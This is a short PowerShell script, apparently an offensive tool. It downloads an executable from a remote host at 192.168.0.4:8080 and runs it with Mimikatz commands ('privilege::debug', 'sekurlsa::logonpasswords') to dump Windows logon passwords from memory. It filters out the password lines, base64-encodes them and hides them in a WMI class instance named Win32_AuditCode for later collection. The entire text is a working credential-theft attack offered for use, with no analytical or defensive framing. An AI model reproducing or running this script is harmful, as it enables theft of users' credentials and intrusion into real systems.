$wc = New-Object System.Net.WebClient
$wc.DownloadFile("http://192.168.0.4:8080/m", "m.exe")

$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
$ProcessInfo.FileName = "m.exe"
$ProcessInfo.RedirectStandardError = $true
$ProcessInfo.RedirectStandardOutput = $true
$ProcessInfo.UseShellExecute = $false
$ProcessInfo.Arguments = @(
    "privilege::debug",
    "sekurlsa::logonpasswords",
    "exit"
)

$Process = New-Object System.Diagnostics.Process
$Process.StartInfo = $ProcessInfo
$Process.Start() | Out-Null

$output = $Process.StandardOutput.ReadToEnd()

$Pws = ""
foreach ($line in ($output -split "`r`n")) {
    if ($line.Contains("Password") -and ($line.Length -lt 50)) {
        $Pws += $line
    }
}

$PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws)
$EncPws  = [Convert]::ToBase64String($PwBytes)

Set-WmiInstance -Path "\\.\root\cimv2:Win32_AuditCode" -Argument @{ Result = $EncPws }
